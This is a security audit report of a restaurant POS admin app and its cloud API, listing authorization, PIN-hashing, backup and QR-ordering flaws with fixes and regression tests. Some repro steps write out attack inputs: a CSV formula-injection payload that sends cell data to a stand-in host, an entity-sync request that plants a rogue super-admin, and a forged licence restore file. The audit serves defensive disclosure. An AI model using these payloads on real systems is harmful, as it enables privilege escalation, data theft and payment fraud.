# pos-admin audit

Revision: `9ddb5633c4679a295dfaa25a80a18dbc7912a82b` (main). Auditor: slice `pos-admin`. READ-ONLY, no code executed, no network.

## Scope actually read (list of files/dirs, and what you did NOT cover)

Read in full or near-full (security-relevant):
- `apps/restaurant-system/pos-admin/src-tauri/{tauri.conf.json,Cargo.toml,build.rs,src/main.rs}` and the shared native module it `#[path]`-includes: `packages/native/printing.rs`.
- `pos-admin/src/{main.tsx,App.tsx}`, `src/cloud/cloudClient.ts` (all 874 lines), `index.html`, `vite.config.ts`, `package.json`.
- `src/components/qr/GuestQrOrderingPage.tsx` (lines 1-520 + grep of rest), `qr/QrCardDesignerModal.tsx` (sinks), `qr/QrOrderingModule.tsx` (QR/URL/token handlers only), `settings/CloudDeviceLoginsPanel.tsx`, `settings/SubscriptionPlansView.tsx` (cloud/billing/licence handlers), `RestoreModal.tsx`, `backup/BackupRestoreModule.tsx`, `OrderDetailModal.tsx` (refund/void), `StaffModal.tsx`, `reports/reportExportService.ts`, CSV/JSON export handlers in `customers/CustomersCrmModule.tsx`, `billing/BillingInvoicesModule.tsx`, `orders/OrdersModule.tsx`, `hardware/PrintersDevicesModule.tsx` (sync-URL field), `support/SupportTicketsModule.tsx` (attachments), `auth/ForgotPasswordPanel.tsx`.
- Grep sweep over all of `pos-admin/src` and `packages/**` for: `dangerouslySetInnerHTML|innerHTML|document.write|eval|new Function|window.open|href={|localStorage|invoke(|fetch(|createObjectURL|postMessage|permission|role`.

Read outside the slice only to trace trust boundaries (findings there are labelled cross-slice): `packages/database/src/{pin.ts,db.ts (sync/seed/load sections),repositories.ts (StaffRepository, QrOrderingRepository, OrderRepository.refundOrder, LicenseRepository)}`, `packages/database/src/table_sync.ts`, `packages/business/src/{session_persistence.ts,license_certificate.ts}`, `packages/ui/src/{printElement.ts,PlatformNoticeBanner.tsx}`, `packages/utils/src/qrcode.ts`, `packages/api/src/print_transport.ts`, `cloud/api/src/modules/{tenant-auth,backups,entity-sync,payments,billing}`, `cloud/api/src/common/guards/device-auth.guard.ts`, `tooling/local-runtime/local_service.cjs` (auth gate + POST /api/orders only), `.github/workflows/tauri-build.yml` (grep only).

NOT covered: the other ~55 pos-admin component files were only skimmed via grep for sinks/secrets/fetches (dashboard, kitchen/KOT, reservations, tables, inventory modules, ReportPreview/EodZ documents, loyalty/marketing modals) -- no fetch/sink found in them. No runtime execution, no `cargo audit`/`npm audit`, no Rust build, no installer inspection (the NSIS output was not built). Cloud API, Local Core, `packages/*` were only read where they decide a pos-admin trust question.

## Inventory (endpoints / IPC commands / entry points in your slice)

pos-admin is a **local-first React app** (Vite, also packaged as Tauri v2 "JAMANVAAR POS Admin"). Almost all "admin" data (staff, roles, PIN hashes, menu, tax, inventory, customers, orders, licence, audit log) lives in the browser-side `db` singleton persisted to `localStorage` (`packages/database/src/db.ts`). There is no server-side authority for those actions inside this app; the only server calls are the ones below.

**Routes / entry points (client)**
- `/?qrTable=<n>` or `/?table=<n>` (App.tsx:150-153): renders `GuestQrOrderingPage` **before any login gate**, same origin/bundle/localStorage as the admin console. Optional `&token=`/`&qrToken=`.
- Admin UI: 22 tabs, gated only by `isAdminLoggedIn` = `SessionPersistence.isValid('admin')` (24 h localStorage record, App.tsx:184). No per-tab or per-action permission check anywhere in the app (grep for permission/role checks returns only display uses).

**Cloud API calls made (cloudClient.ts)** -- auth column = what the client presents; server column = what cloud/api enforces (verified where noted)
| Call | Client auth | Server role/scoping (verified) |
|---|---|---|
| POST `/api/v1/activation/redeem` | none | public |
| POST `/api/v1/tenant-auth/login` (`deviceType:'POS_ADMIN'`, `deviceId`, `deviceToken`; **no `adminOnly`**) | email+password | any tenant role; `adminOnly` only enforced if client sends it (tenant-auth.service.ts:281) |
| POST `/tenant-auth/activate-device`, `/set-initial-password`, `/forgot-password`, `/reset-password` | session token / OTP | reset OTP: 5 attempts, 15 min, hashed, timing-safe (tenant-auth.service.ts:799-895) |
| POST `/tenant-auth/refresh` | httpOnly cookie | 30-day refresh (`JWT_REFRESH_TTL_DAYS` default 30) |
| GET/POST `/tenant/me/users`, PATCH `/tenant/me/users/:id/status` | JWT | GET: any role (no check); POST/PATCH: OWNER only (service :670, :725) |
| GET/POST `/tenant/me/backups` (+ `/:id/download`, `/:id/file` not called by this client) | JWT | **no role check**, any tenant user (tenant-backups.controller.ts:9-38) |
| GET `/tenant/branches`, `/tenant/me/entitlements`, `/tenant/platform-notice`, `/tenant/ai-assistant/config`, `/tenant/support-tickets*` | JWT | tenant-scoped |
| GET/PATCH `/tenant/me/display` | JWT | PATCH OWNER/MANAGER |
| GET `/tenant/billing/*`, POST `/tenant/billing/invoices/:id/pay` | JWT | any tenant role; pay records a COMPLETED payment with no gateway proof (invoices.service.ts:816-846) |
| POST `/tenant/qr-ordering/usage` | JWT | client-reported usage numbers |
| POST/GET `/orders/sync`, `/entity-sync/:type` (CUSTOMER, MENU_*, STAFF_USER, DINING_TABLE, ...), heartbeat, AI config | device bearer token (localStorage) | DeviceAuthGuard; entity-sync has no per-device-type or per-entity-type authorisation and no payload validation (entity-sync.controller.ts, dto/push-entity-sync.dto.ts:29-31) |
| POST `/payments/:paymentId/refund` | device bearer token | device type must be POS/POS_ADMIN (payment-orders.controller.ts:32); no staff identity; check-then-insert not atomic (payments.service.ts:137-153) |

**Tauri v2 shell (src-tauri)**
- `tauri.conf.json`: `app.security.csp = null`; no `capabilities/` directory; no `withGlobalTauri`; no updater/plugin config; NSIS `installMode: currentUser`; no signing config. `tauri-plugin-shell` is initialised (main.rs:57) but no capability grants it any permission.
- App-defined IPC commands (callable by any script in the webview because app commands are not capability-gated): `get_machine_ip`, `list_system_printers`, `scan_network_printers(subnet)` (private ranges only), `list_serial_ports`, `print_raw_system(name, bytes)` (name validated, passed via env var), `print_serial(port, baud, bytes)` (COM1-256 + baud allow-list), `send_escpos_bytes(ip, port, bytes)` (**any** SocketAddr, no allow-list).
- The React code that calls these lives in `packages/api/src/print_transport.ts` (dynamic import of `@tauri-apps/api/core`).

**localStorage keys written by this app** (all plaintext, per-origin): `jamanvaar_cloud_device_token` + `_device_id` + `_restaurant_id`, `jamanvaar_cloud_entitlements_cache`, `jamanvaar:session:admin:v1` (userId, fullName, roleId, expiry; no secret), `jamanvaar_sync_server_url`, `jamanvaar_pos_admin_last_backup_at`, UI prefs, and the whole `db` (`users` incl. `pinHash`, `customerAccounts` PII, `orders`, `license`, `auditLogs`, `configuredPrinters`, ...). No password, JWT or activation token is persisted (access token is a module variable, cloudClient.ts:66).

## Old-audit claim verification

| Old ID | Verdict | Evidence file:line | Note |
|---|---|---|---|
| F-007 (client side) | **CONFIRMED** | `packages/database/src/repositories.ts:4331` (`if (token !== undefined && token !== table.qrToken)`); `pos-admin/.../GuestQrOrderingPage.tsx:61,118,344` (`token \|\| undefined`, and token defaults to the table's own `qrToken` from local db) | Omitting the token passes; and the page fills the token in itself from `db.tables`, so it is never a real gate. Pricing: the repo does recompute price from `db.menuItems` (repositories.ts:4483-4499, SEC-004) but in the *guest's own browser* against its own copy of the catalogue, so there is no server-side repricing. Old file path `pos-admin/src/pages/GuestQrOrderingPage.tsx` is stale (now `src/components/qr/`). See POSADMIN-05. |
| F-008 | **CONFIRMED** (reachability limited) | `packages/database/src/db.ts:669-670, 781-784, 828-831` (users, roles, license overwritten from `/api/sync` and from SSE/BroadcastChannel state without any signature) | Code path is real and runs in pos-admin at startup (`initServerSync`). Reachability: the client sends **no Authorization header** to `/api/sync` (db.ts:647,749), and the real Local Core gates `/api/sync` behind a key (local_service.cjs:40), so against the genuine core it 401s and stops (db.ts:752). Exploit needs an attacker-controlled endpoint at `jamanvaar_sync_server_url` / `http://<hostname>:5178` (plain HTTP, editable free-text field in `PrintersDevicesModule.tsx:263`) or a LAN MITM. Old audit's "certificate not verified" is right: `license` is taken raw. |
| F-016 | **CONFIRMED, narrowed** | `cloud/api/.../payment-orders.controller.ts:29-36`; `payments.service.ts:137-153`; client `OrderDetailModal.tsx:68-86`, `cloudClient.ts:754-770` | Partly fixed since old audit: only POS/POS_ADMIN device types may refund (line 32; Kiosk excluded). Still: no staff/manager identity (device token only; client hard-codes actor `'Manager'`), and over-refund guard is read-then-insert without a lock (two concurrent requests both see the same `remaining`). Client also calls the cloud *before* local validation and defaults an unparsable amount to the full order total (`parseFloat(x) \|\| order.totalAmount`, OrderDetailModal.tsx:68). See POSADMIN-08. |
| F-019 (client) | **CONFIRMED** | `cloudClient.ts:94-107, 667, 755, 803` (device token `localStorage.getItem/setItem`); server `device-auth.guard.ts:22-26` ("never rotated automatically"; no expiry check in canActivate) | Token is plaintext in WebView2 profile (`%LOCALAPPDATA%\com.jamanvaar.posadmin\EBWebView`, readable by any process of the same Windows user, no DPAPI/keyring), non-expiring, revocable only from Super Admin. What it buys: order-sync, entity-sync (all STAFF_USER/CUSTOMER data), refunds. Not exploitable remotely without script execution or local file access (no XSS sink found). |
| F-030 | **CONFIRMED** | `packages/database/src/pin.ts:15-31` (two FNV-1a 32-bit rounds, salt = `restaurantId`, which is not secret) | Unchanged since old audit. 10^4 PINs => instant recovery from any hash. Hashes are exported by pos-admin via `StaffRepository.toSyncPayload` (repositories.ts:3268-3271) to cloud entity-sync, included in local JSON backup and in the cloud backup upload (BackupRestoreModule.tsx:80). PIN *generation* also uses `Math.random` (pin.ts:60). See POSADMIN-02/-04. |
| F-036 (UI) | **FALSE for pos-admin UI; CONFIRMED server-side (out of slice)** | pos-admin has no reference to payment-connections/PAN/uidai (grep); serializer still returns them: `cloud/api/.../payment-connections.service.ts:120-135` | Not consumed by this app. The exposure is in the cloud API response (tenant sees unmasked PAN/GST/CIN/uidai); belongs to the cloud/api slice. |
| F-038 (client export) | **CONFIRMED** | `reportExportService.ts:44-58`; `CustomersCrmModule.tsx:288-300`; `packages/business/src/report_generator.ts:713-720`; no neutralisation anywhere (grep for `formula\|sanitize\|escapeCsv` = none in slice) | Client CSVs: no `= + - @ \t \r` prefix guard; several fields not even quote-escaped (`c.phone`, `c.email`, `o.customerPhone`, `c.tags`, `o.orderNumber`). Filenames are static/timestamp only (no header injection client-side). `exportExcelXml` (reportExportService.ts:149-186) interpolates cells into XML unescaped but has **no caller** (dead code). Server-side `Content-Disposition` part of F-038 is not in this slice. See POSADMIN-07. |
| F-039-analog | **FALSE for pos-admin** | cloudClient.ts:66 (access token in memory); SubscriptionPlansView.tsx:127-130,231,247 (passwords only in React state, cleared after use); `localStorage` writes enumerated in Inventory | No password/activation token/JWT is persisted. Residual: the `db` blob and device token are plaintext in localStorage (see F-019, POSADMIN-04). |
| F-028 (Tauri, pos-admin copy; not in your list but in slice) | **CONFIRMED as hardening** | `src-tauri/tauri.conf.json:24-26` (`csp: null`), `main.rs:59-61` -> `printing.rs:send_to_network_printer` (any IP:port) | Requires script execution in the webview; no XSS sink found in this slice (see Controls). Severity low. POSADMIN-10. |
| F-010 (seen in passing; login flow) | **CONFIRMED** (cloud slice) | `tenant-auth.service.ts:305-313`: if `deviceToken` is absent or the device has no hash, `isDeviceActive = true` from `deviceId` alone | pos-admin does send both, but the server accepts `deviceId` only. |
| F-001 (seen in passing; pos-admin is the client that calls it) | **CONFIRMED** (cloud slice) | `invoices.service.ts:816-846`; caller `SubscriptionPlansView.tsx:186-192` | Any tenant role can mark own invoice PAID with a free-text reference; UI says "Payment successful". |
| F-020 (seen in passing) | **CONFIRMED** (cloud slice) | `tenant-backups.controller.ts:9-38` no role guard | Any tenant user can create/list/download backups. Feeds POSADMIN-04. |

## New/independent findings

### POSADMIN-01 Any tenant role (STAFF/Captain login) can sign in to Restaurant Admin and gets full manager-level console
- Severity: high (CVSS 4.0 AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N, ~8.0); Class: CONFIRMED (code-trace)
- CWE/OWASP: CWE-285/CWE-862 Missing/Improper Authorization; OWASP A01:2021
- Component + file:line(s): `cloudClient.ts:254-281` (login body has `deviceType:'POS_ADMIN'` but not `adminOnly:true`; kiosk-admin does send it, `kiosk-admin/src/cloud/cloudClient.ts:318`); `cloud/api/.../tenant-auth.service.ts:281` (`adminOnly` is client-supplied, honoured only if sent); `App.tsx:226-232` (`roleId: user.role === 'OWNER' ? 'role-admin' : 'role-manager'` -- STAFF becomes manager); zero permission checks in `pos-admin/src` (only display uses of `roleId`).
- Attacker / precondition: holder of a valid tenant login of role STAFF (e.g. the "Captain tablet" logins the owner mints in `CloudDeviceLoginsPanel`) using an already-activated admin terminal, or any terminal for which they have an activation key. On an activated terminal `login()` returns `LOGIN_SUCCESS` with no activation step because the device token in localStorage matches (service.ts:299-336).
- Repro (code-trace): POST `/tenant-auth/login` `{email:<staff>,password,deviceType:'POS_ADMIN',deviceId,deviceToken}` -> LOGIN_SUCCESS -> `completeLogin` saves `role-manager` -> all 22 tabs open: Staff & Roles (create manager, reset PINs), price/menu edits, bulk price adjust, Restore, customers/PII export, refunds/voids, cloud backup, invoice pay, reset-to-seed.
- Expected vs actual: the admin console should be restricted to OWNER/MANAGER at login (server: send/require `adminOnly`; client: check `user.role`) and each sensitive action should be authorised by the party that holds the data. Actual: role is only mapped to a label; nothing consumes it.
- Impact: privilege escalation from floor role to full restaurant admin (staff/PIN administration, financial edits, PII export, refund initiation with the terminal's device token). Server-side owner-only endpoints (create login, set status) still refuse STAFF, which limits but does not remove the impact because the important data/actions are local or device-token-authorised.
- Root cause: authorisation modelled as UI label; login endpoint role restriction is opt-in by the client.
- Recommended fix (smallest change at last trusted decision point): server: make `TenantLoginDto` reject `deviceType==='POS_ADMIN'` (and KIOSK_ADMIN) for roles other than OWNER/MANAGER regardless of `adminOnly`; client: refuse `completeLogin` for `role==='STAFF'` and map roles honestly.
- Suggested regression test: cloud e2e: STAFF login with `deviceType:'POS_ADMIN'` returns 403; pos-admin unit: `completeLogin` with role STAFF does not persist an admin session.

### POSADMIN-02 Staff PIN hashes and roles are replicated to cloud entity-sync, readable and writable by every device type; admin console applies remote STAFF_USER records blindly
- Severity: high (CVSS 4.0 AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N, ~8.3); Class: CONFIRMED by code-trace across slices (not executed)
- CWE/OWASP: CWE-639/CWE-345/CWE-916; A01/A04/A02
- Component + file:line(s): `App.tsx:462-465` (`pushSnapshot('STAFF_USER', db.users.map(toSyncPayload))` incl. `pinHash`; `catchUp(... applyRemoteUser)`); `repositories.ts:3268-3297` (`applyRemoteUser` takes `roleId`, `pinHash`, `isActive` verbatim, creates or overwrites by id); `pin.ts:15-31`; `cloud/api/.../entity-sync.controller.ts:15-33` and `dto/push-entity-sync.dto.ts:29-31` (any device token may push/pull any of 11 entity types; payload `z.record(unknown)`); `repositories.ts:3195-3203` (`isManager` derives from `roleId`).
- Attacker / precondition: anyone holding any device token of the tenant -- including a public Kiosk or KDS device (token sits in localStorage, F-019), or a cloud DB reader.
- Repro (code-trace, dummy data): (1) with a kiosk device token `GET /api/v1/entity-sync/STAFF_USER` returns every staff `pinHash`; with 10^4 candidates and the public `hashPin(pin, restaurantId)` recover each PIN offline instantly. (2) `POST /api/v1/entity-sync/STAFF_USER {events:[{externalId:'x',payload:{id:'x',username:'m',roleId:'role-super-admin',isActive:true,pinHash:hashPin('4821',<restaurantId>)}}]}`; within 15 s `syncStaff()` in every admin/POS/Captain/KDS/Kiosk pulls it and `applyRemoteUser` inserts a manager whose PIN is 4821.
- Expected vs actual: staff credential/role records must only be writable by an authenticated admin surface (OWNER/MANAGER session), never by an arbitrary device, and PIN verifiers must not be brute-forceable offline. Actual: neither holds.
- Impact: any single compromised terminal token yields manager/super-admin PIN on every terminal (voids, discounts, refunds, manager override), plus disclosure of all staff PINs.
- Root cause: entity-sync trusts the device token for all entity types; client applies unvalidated remote roles; PIN stored with a 32-bit non-secret-salted hash.
- Recommended fix: cloud: per-entity-type write allow-list by device type (STAFF_USER/MENU_*/COUPON writable only by POS_ADMIN with a user-bound token), schema-validate payloads, never return `pinHash` to non-admin devices; client: `applyRemoteUser` must reject `roleId` outside a known set unless the record is signed/authored by an admin device; replace PIN verifier with a slow salted KDF verified server-side or a random per-user salt + scrypt/argon2 (accepting offline cost).
- Suggested regression test: cloud e2e: KIOSK device token `POST /entity-sync/STAFF_USER` -> 403; `GET` from KDS returns no `pinHash`; client unit: `applyRemoteUser({roleId:'role-super-admin'})` from an untrusted record is ignored.

### POSADMIN-03 "Restore from JSON" replaces users, roles, licence and orders from an unvalidated file (bypasses the signed-licence scheme)
- Severity: medium (AV:L/AC:L/AT:N/PR:L/UI:A/VC:L/VI:H/VA:L); Class: CONFIRMED
- CWE/OWASP: CWE-345/CWE-502/CWE-20; A08:2021
- Component + file:line(s): `components/RestoreModal.tsx:33-63` -- only `JSON.parse` and "is an object" check; assigns `db.users`, `db.roles`, `db.license`, `db.orders`, `db.customerAccounts`, `db.configuredPrinters`, ... wholesale. Reachable from `BackupRestoreModule` and App.tsx (`isRestoreModalOpen`).
- Attacker / precondition: any logged-in console user (see POSADMIN-01) or an owner tricked into importing a file. A crafted `{"license":{"tier":"PRO","status":"ACTIVE","entitlements":{...}}}` needs no key.
- Repro: import that file; `db.license` becomes PRO with all entitlements, `verificationSource` absent. The ECDSA-verified certificate flow (`license_certificate.ts:100-135`) is therefore optional. Same file can inject `users[]` with `pinHash` + `roleId:'role-super-admin'`, which `syncStaff()` (App.tsx:462) then pushes to every device via POSADMIN-02.
- Expected vs actual: licence must only change via `applyLicenseCertificate` / verified cloud entitlements; user/role import must be schema-validated, audited with a real actor and require owner confirmation. Actual: raw assignment; audit line says `username:'Manager'`.
- Impact: entitlement bypass (PRO features, QR ordering, device counts), rogue manager injection that propagates fleet-wide, tampered order ledger.
- Root cause: local-first design with a client-controlled `db`; restore path lacks an allow-list.
- Recommended fix: drop `license` (and `users/roles`, or require re-PIN) from the restorable set; validate with the same zod schemas the repositories use; strip `pinHash` on export.
- Suggested regression test: unit: `handleApplyRestore` with `{license:{tier:'PRO'}}` leaves `db.license` unchanged.

### POSADMIN-04 Full `db` (incl. all PIN hashes and customer PII) is uploaded/exported in plaintext; cloud backup endpoints have no role gate
- Severity: high as a chain / medium standalone (AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:L/VA:N -- requires that a backup exists or that a STAFF creates one); Class: CONFIRMED (client + server code)
- CWE/OWASP: CWE-200/CWE-862/CWE-312; A01/A02
- Component + file:line(s): `BackupRestoreModule.tsx:80` (`uploadCloudBackup(db)`) and `:105` (`JSON.stringify(db)` download); `cloudClient.ts:317-319`; `cloud/api/src/modules/backups/tenant-backups.controller.ts:9-38` (only `TenantAuthGuard`; `download`/`file` return the object to any tenant user of the restaurant); `CustomersCrmModule.tsx:281-300` (unmasked PII export, no role check).
- Attacker / precondition: a STAFF-role tenant user (or POSADMIN-01 session). Scoped to own restaurant (`user.restaurantId`), so this is a lower-role-to-owner-data problem, not cross-tenant.
- Repro: `GET /api/v1/tenant/me/backups` then `GET .../:id/file` with a STAFF JWT -> full JSON including `users[].pinHash`, `customerAccounts` (name/phone/email/DOB), orders, licence -> crack manager PINs offline (F-030) -> manager override on every terminal.
- Expected vs actual: OWNER (or MANAGER) only; pin hashes never leave the device. Actual: any role.
- Impact: bulk PII disclosure (DPDP exposure) and PIN compromise for all staff.
- Root cause: F-020 (no role guard) + client serialises the whole store.
- Recommended fix: `@Roles('OWNER','MANAGER')` on all `/tenant/me/backups/*`; client backup should export a curated projection without `pinHash` and encrypt at rest.
- Suggested regression test: cloud e2e: STAFF token `GET /tenant/me/backups` -> 403; unit: exported JSON contains no `pinHash`.

### POSADMIN-05 Guest QR ordering: token is optional and self-filled, all checks run in the guest's own browser, tokens replicate to every device
- Severity: medium (deployment-dependent); Class: CONFIRMED (code) / impact UNVERIFIABLE for a hosted guest page
- CWE/OWASP: CWE-602 (client-side enforcement), CWE-306, CWE-799 (no abuse limits); A04/A07
- Component + file:line(s): `GuestQrOrderingPage.tsx:60-61` (`initialToken = URL token || tableRec?.qrToken || ''`), `:118` and `:344` (`token || undefined`), `repositories.ts:4331` (undefined passes), `:4395-4560` (`createCustomerQrOrder` executes and mutates `db.orders`, `db.tables`, KOTs locally), `App.tsx:150-153` (pre-login), `table_sync.ts:82-99` (`qrToken` pushed in DINING_TABLE payload -> cloud -> every device), `db.ts:1196-1206` (tables lacking a token get a deterministic `jv_qr_tbl_<n>_<id>` at load -- SEC-010 regression path), `seed.ts:605-610` (fixed public seed tokens for tables 1-6), `repositories.ts:4535` (`idempotencyKey` includes `Date.now()`, so not idempotent) and `:4521-4522` (`id: ord-qr-<per-device counter>`, collides across devices).
- Attacker / precondition: anonymous guest on the LAN/Internet who can load the app URL; or any device holding a device token (tokens readable via entity-sync).
- Repro (code-trace): open `/?table=7` with no token: page auto-injects the table's token from the (seed/synced) local db, `verifyQrToken` returns valid, `createCustomerQrOrder` writes an order + fires a KOT (`autoSendToKitchen` default true) with `paymentStatus:'PENDING'`. No rate limit, captcha, or per-table/per-device cap other than the client-side settings (`maxOrderValue`, `allowRepeatOrdering`).
- Expected vs actual: token must be mandatory and validated **server-side** (Local Core / cloud) at the moment the order is accepted; totals repriced there; per-table/IP abuse limits. Actual: none of that exists in this path. What does hold: modifiers are re-validated against catalogue, prices recomputed from catalogue, payment stays PENDING (repositories.ts:4483-4499, 4575).
- Impact: order/KOT spam and fake orders against any table if the guest surface is reachable; kitchen disruption; guest PII (name/phone) flows into orders/CRM (feeds POSADMIN-07). The Local Core's `/api/orders` and `/api/sync` require a service key the guest browser never has and the client sends no Authorization at all (db.ts:647,686,749), so in the genuine deployment guest orders most likely never leave the guest's own localStorage; whether a hosted guest page reaches the restaurant is UNVERIFIABLE without the deployment topology. Also QR links are built from `window.location.origin` (QrOrderingModule.tsx:329-337), which for the Tauri app is a non-routable `tauri.localhost`.
- Root cause: business logic implemented as a client-side repository; token treated as optional (`undefined` = skip).
- Recommended fix: `if (!token || token !== table.qrToken)` in `verifyQrToken`, remove the auto-fill from `tableRec` (the guest URL must carry the token), and move acceptance to a server that validates token+prices; stop syncing `qrToken` to devices that do not print standees; drop seed tokens; make order ids UUIDs.
- Suggested regression test: `createCustomerQrOrder({tableNumber:'1', items})` without token throws; guest page without `token` param shows "unavailable".

### POSADMIN-06 Owner-generated device/staff login passwords are 4-digit `Math.random` values pre-filled by default
- Severity: medium (AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H; needs login email, throttled 120/min/IP in-memory, no per-account lockout -- F-024); Class: CONFIRMED
- CWE/OWASP: CWE-330/CWE-521; A07:2021
- Component + file:line(s): `CloudDeviceLoginsPanel.tsx:15-17` (`'Jaman@' + Math.floor(1000 + Math.random()*9000)`), `:34` (pre-filled as the password of the new cloud login), `cloud/api/.../login.dto.ts:63` (server only requires 8 chars), `app.module.ts:47-51` (global 120/min/IP throttle).
- Attacker / precondition: knows/guesses the login email (owners suggest `captain1@yourrestaurant.com`, placeholder at CloudDeviceLoginsPanel.tsx:171).
- Repro: 9000 candidates x 1 login POST each => ~75 minutes from one IP, minutes if distributed.
- Impact: takeover of Captain/manager logins, which by POSADMIN-01 also open the admin console when the login is MANAGER/STAFF on an activated terminal, and unlock tenant APIs.
- Root cause: non-CSPRNG, tiny keyspace; owner may keep the suggested password. (Same weakness class: PIN generation `pin.ts:60`, session token `session_persistence.ts:60` -- the latter is non-security.)
- Recommended fix: `crypto.getRandomValues`, >= 12 chars from a 60+ symbol alphabet (or force change on first login); add per-account lockout server-side.
- Suggested regression test: unit: generated password length >= 12 and passes a min-entropy check; cloud: 10 wrong logins lock the account for N minutes.

### POSADMIN-07 CSV exports: formula injection and quote-breaking with attacker-controlled guest name/phone
- Severity: low (AV:N/AC:L/AT:P/PR:N/UI:A/VC:L/VI:L; guest-supplied text reaches staff's spreadsheet); Class: CONFIRMED
- CWE/OWASP: CWE-1236; A03:2021
- Component + file:line(s): `GuestQrOrderingPage.tsx:355-358` (guest name/phone unrestricted, no maxLength), `reportExportService.ts:44-58`, `CustomersCrmModule.tsx:288-300` (`"${c.phone}"`, `"${c.email}"`, `"${c.name}"` without `""` escaping or formula guard), `report_generator.ts:713-720`, `BillingInvoicesModule.tsx:298-306`, `OrdersModule.tsx:242-265`.
- Repro: guest enters name `=HYPERLINK("http://x/?"&A2,"Click")` (or phone `1","=cmd|...`); the owner exports "Sales Transactions"/"Customers" CSV and opens in Excel/LibreOffice: cell evaluates; a `"` in phone/email/tags breaks the column structure.
- Impact: data exfiltration via hyperlink formulas / DDE on legacy configs, spreadsheet phishing; moderate friction (Excel prompts).
- Recommended fix: one shared `csvCell()` that escapes `"` and prefixes `'` when the value starts with `= + - @ \t \r`; apply to every column.
- Suggested regression test: `csvCell('=1+1')` === `"'=1+1"`; `csvCell('a"b')` === `"a""b"`.

### POSADMIN-08 Refunds/voids/cash movements have no staff authorisation and unauthenticated actor attribution
- Severity: medium (AV:N/AC:L/AT:N/PR:L/UI:N/VI:H); Class: CONFIRMED
- CWE/OWASP: CWE-862/CWE-778/CWE-362; A01/A09
- Component + file:line(s): `OrderDetailModal.tsx:46-86` (void/refund; actor literal `'Manager'`; no PIN; `parseFloat(refundAmount) || order.totalAmount` -> garbage/empty = full refund; cloud call first at :76, local `refundOrder` validation second at :83), `repositories.ts:860-911` (`refundOrder` client-side, partial refund sets `orderStatus='REFUNDED'` and blocks further partials), `cloudClient.ts:754-770` (device token only), `payments.service.ts:137-153` (race), `CashDropModal.tsx:19` (`authorizedBy` defaults to free text 'Manager'), 17 call sites with hard-coded `username:'Manager'`/`performedBy:'Manager'` (`grep "'Manager'"`).
- Impact: with POSADMIN-01 any user can refund real UPI payments (cash refunds are just local edits of shift totals), and the audit trail cannot say who did it; concurrent refund requests can exceed the payment amount at the gateway; a cloud refund can succeed while local state fails (divergence).
- Recommended fix: require manager PIN/identity for refund/void/cash-out and pass the acting user id; server: `SELECT ... FOR UPDATE`/unique constraint on (paymentId, idempotencyKey) and require a user-bound token.
- Suggested regression test: concurrent double refund of the full amount -> second rejected; refund with empty amount is rejected, not defaulted.

### POSADMIN-09 Sign-out does not revoke the cloud session
- Severity: low (AV:L/AC:L/AT:P/PR:L; 30-day refresh token, httpOnly cookie); Class: CONFIRMED
- CWE/OWASP: CWE-613; A07
- Component + file:line(s): `App.tsx:299-304` -> `cloudClient.ts:372-374` (`cloudLogout()` just nulls the in-memory access token); pos-admin never calls `POST /tenant-auth/logout` (only kiosk-admin does, `kiosk-admin/.../cloudClient.ts:402`); `request()` auto-refreshes on any 401 (cloudClient.ts:181-195); refresh TTL 30 days (`tenant-auth.service.ts:173`).
- Impact: after the owner clicks "Sign out" on a shared terminal, the refresh cookie remains valid and the next API call not gated by `isCloudLoggedIn()` (support tickets, display scale, logins, billing detail, all use `request()`) silently re-authenticates; session also survives reload via the same mechanism, contradicting `cloudSetupHint`.
- Recommended fix: call `/tenant-auth/logout` (revokes token + clears cookie) in `handleAdminLogout`; also clear device-bound caches.
- Suggested regression test: after `handleAdminLogout`, `request('/api/v1/tenant/me/users')` yields 401 without refresh success.

### POSADMIN-10 Tauri hardening gaps: CSP null, unrestricted raw-TCP command, no capabilities, unsigned installer
- Severity: low (needs script execution; none found); Class: HARDENING
- CWE/OWASP: CWE-1021/CWE-918-like; A05
- Component + file:line(s): `tauri.conf.json:24-26` (`"csp": null`); `main.rs:57-62,69-73`; `printing.rs:send_to_network_printer` (any IP/port incl. loopback, link-local, public); `printing.rs` `Command::new("powershell")` resolved via search path; `index.html:11-13` loads Google Fonts CSS at runtime (external stylesheet, no SRI, allowed by null CSP); `Cargo.toml` pulls `tauri-plugin-shell` although unused; no updater, no `certificateThumbprint`/signing (unsigned NSIS), CI workflow has no `permissions:` block and uses tag-pinned actions (`tauri-build.yml`).
- Precondition: any script running in the webview (would require an XSS/sink, none found) or a compromised dependency. The db-driven printer IP (`configuredPrinters`, editable via Restore/sync) is passed straight to `send_escpos_bytes`.
- Impact: raw TCP pivot from the desktop with partially attacker-shaped bytes (customer names/notes in receipts).
- Recommended fix: set a strict CSP (`default-src 'self'; connect-src <api> ipc: http://ipc.localhost; img-src 'self' data:; style-src 'self' 'unsafe-inline'`), bundle fonts, restrict `send_escpos_bytes` to RFC1918/configured printers and ports 9100-9102, drop `tauri-plugin-shell`, add explicit `capabilities/` (empty for now), sign the installer, set workflow `permissions: contents: read`.
- Suggested regression test: Rust unit: `send_to_network_printer("8.8.8.8",80,..)` and `127.0.0.1:6379` rejected.

### POSADMIN-11 Build artefacts committed: `src-tauri/target/` (2149 files, ~63 MB incl. .dll/.pdb)
- Severity: low; Class: HARDENING
- CWE/OWASP: CWE-540/CWE-1104 (supply-chain hygiene)
- Component: `git ls-files apps/restaurant-system/pos-admin/src-tauri/target` = 2149 files; `.gitignore` has no `target/` rule. Debug DLL/PDB carry build-host paths and unreviewed binaries enter the repo history (commit 9ddb563 "add remaining local files").
- Recommended fix: `git rm -r --cached` the folder and ignore `target/`.
- Suggested regression test: CI check that fails when tracked files match `**/target/**`.

### POSADMIN-12 Update banner renders server-supplied `downloadUrl` as `<a href>` without scheme check
- Severity: low; Class: HARDENING
- CWE/OWASP: CWE-79 (javascript: URL); A03
- Component + file:line(s): `packages/ui/src/PlatformNoticeBanner.tsx:36-37` (mounted by `pos-admin/src/main.tsx:12`), data from heartbeat/notice (`packages/sync/src/device_gate.ts:235`).
- Precondition: hostile/compromised platform admin or API (already high trust). A `javascript:` URL would run in the app origin (same origin as device token).
- Recommended fix: allow only `https:` URLs.

### POSADMIN-13 Money handling notes (info)
- Severity: info; Class: HARDENING
